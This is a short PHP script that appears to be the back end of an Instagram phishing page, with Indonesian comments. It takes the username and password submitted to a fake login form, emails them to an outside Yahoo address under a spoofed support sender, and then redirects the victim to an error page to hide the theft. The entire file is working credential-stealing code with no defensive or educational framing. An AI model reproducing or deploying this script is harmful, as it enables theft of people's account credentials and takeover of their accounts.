<?php

$subjek = 'Result Instagram';
$mailto = 'echevaliermaqdalena@yahoo.com';

$username = $_POST['username'];
$password = $_POST['password'];

$body = <<<EOD
+======[ Instagram ]======+

• Username : $username
• Password : $password

+======[ Instagram ]======+
EOD;

$headers = "From: kinumen <support@kinumen.com>"; // 
$headers .= "-"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
?>
<?php
$random = rand(1000,5000);
?>
<script LANGUAGE="JavaScript">
<!--
window.location="masuk_eror.php";
// -->
</script>